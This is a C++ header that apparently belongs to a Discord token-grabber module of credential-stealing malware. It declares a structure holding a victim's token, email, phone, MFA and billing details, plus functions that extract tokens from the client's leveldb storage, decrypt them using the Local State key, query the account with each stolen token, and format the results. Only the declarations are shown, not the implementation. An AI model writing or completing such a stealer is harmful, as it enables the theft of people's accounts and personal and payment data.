 
#pragma once
#include <string>
#include <vector>
namespace Modules {
    struct DiscordAccount {
        std::string Token;
        std::string Source;     
        std::string Username;
        std::string ID;
        std::string Email;
        std::string Phone;
        std::string Nitro;
        std::string MFA;
        std::string Billing;
        std::string Avatar;
        bool Valid = false;
    };
    class Discord {
    public:
        static std::vector<DiscordAccount> Grab();
        static std::string Format(const std::vector<DiscordAccount>& data);
    private:
        static std::vector<std::string> ExtractFromPath(const std::string& leveldbPath, const std::string& localStatePath);
        static std::string DecryptVaultToken(const std::string& b64, const std::string& localStatePath);
        static DiscordAccount FetchInfo(const std::string& token, const std::string& source);
        static std::string ParseJson(const std::string& json, const std::string& key);
    };
}
